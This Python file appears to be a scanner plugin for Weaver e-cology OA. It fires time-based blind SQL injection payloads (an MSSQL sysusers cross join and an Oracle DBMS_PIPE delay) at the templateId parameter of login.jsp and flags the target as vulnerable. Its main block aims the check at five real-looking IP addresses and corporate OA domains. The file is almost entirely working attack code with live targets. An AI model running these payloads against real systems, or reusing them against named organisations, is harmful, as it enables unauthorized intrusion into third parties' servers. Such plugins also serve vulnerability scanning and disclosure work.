#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = wui/theme/ecology7/page/login.jsp?templateId=1
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-074007

import re
import md5
import time

def assign(service, arg):
    if service == 'weaver_e-cology':
        return True, arg

def audit(arg):
    #MSSQL
    payload1 = "wui/theme/ecology7/page/login.jsp?templateId=1'%20and%20(SELECT%20count(*)%20FROM%20sysusers%20AS%20sys1,%20sysusers%20assys2,%20sysusers%20as%20sys3,%20sysusers%20AS%20sys4,%20sysusers%20AS%20sys5,%20sysusers%20AS%20sys6,sysusers%20AS%20sys7,%20sysusers%20AS%20sys8)=1%20and%20'1'='1"
    payload2 = "wui/theme/ecology7/page/login.jsp?templateId=1'%20and%201=1%20and%20'1'='1"
    t1 = time.time()
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2) 
    t3 = time.time()
    if (t2 - t1 - t3 + t2 > 3):
        security_hole(_1+' has injection(MSSQL)')
    #Oracle
    else:
        payload1 = "wui/theme/ecology7/page/login.jsp?templateId=1'%20AND%206120=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(102)||CHR(119)||CHR(86),5)%20AND%20'bcBY'='bcBY"
        payload2 = "wui/theme/ecology7/page/login.jsp?templateId=1'%20AND%206120=6120%20AND%20'bcBY'='bcBY"
        t1 = time.time()
        code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
        t2 = time.time()
        code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2) 
        t3 = time.time()
        if (t2 - t1 - t3 + t2 > 3):
            security_hole(_1+' has injection(Oracle)')

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_e-cology', 'http://59.49.15.130:82/')[1])
    audit(assign('weaver_e-cology', 'http://58.62.113.250:8088/')[1])
    audit(assign('weaver_e-cology', 'http://oa.fosun.com/')[1])
    audit(assign('weaver_e-cology', 'http://oa.baixiangfood.com/')[1])
    audit(assign('weaver_e-cology', 'http://oa.hbxx.com.cn/')[1])